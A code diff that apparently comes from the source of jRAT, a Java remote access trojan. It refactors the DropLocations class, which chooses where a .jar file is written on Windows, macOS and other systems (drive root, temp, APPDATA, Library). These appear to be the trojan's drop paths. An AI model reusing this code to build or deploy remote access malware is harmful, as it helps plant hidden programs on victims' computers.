@@ -2,8 +2,10 @@ package se.jrat.common;
 
 import java.io.File;
 
+import com.redpois0n.oslib.AbstractOperatingSystem;
 import com.redpois0n.oslib.OperatingSystem;
-import com.redpois0n.oslib.WindowsVersion;
+import com.redpois0n.oslib.windows.WindowsOperatingSystem;
+import com.redpois0n.oslib.windows.WindowsVersion;
 
 public class DropLocations {
 	
@@ -17,22 +19,24 @@ public class DropLocations {
 	public static File getFile(int i, String fileName) throws Exception {
 		File file = null;
 				
-		if (i == 0 || OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS && WindowsVersion.getFromString() == WindowsVersion.WINXP) {
-			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
+		AbstractOperatingSystem os = OperatingSystem.getOperatingSystem();
+		
+		if (i == 0 || os.getType() == OperatingSystem.WINDOWS && ((WindowsOperatingSystem) os).getVersion() == WindowsVersion.WINXP) {
+			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
 				file = new File("C:\\" + fileName + ".jar");
 			} else {
 				file = new File("/" + fileName + ".jar");
 			}
 		} else if (i == 1) {
-			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
+			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
 				file = File.createTempFile(fileName, ".jar");
 			} else {
 				file = new File(System.getProperty("user.home") + "/Documents/" + fileName + ".jar");
 			}
 		} else if (i == 2) {
-			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
+			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
 				file = new File(System.getenv("APPDATA") + "\\" + fileName + ".jar");
-			} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
+			} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
 				file = new File(System.getProperty("user.home") + "/Library/" + fileName + ".jar");
 			} else {
 				file = File.createTempFile(fileName, ".jar");
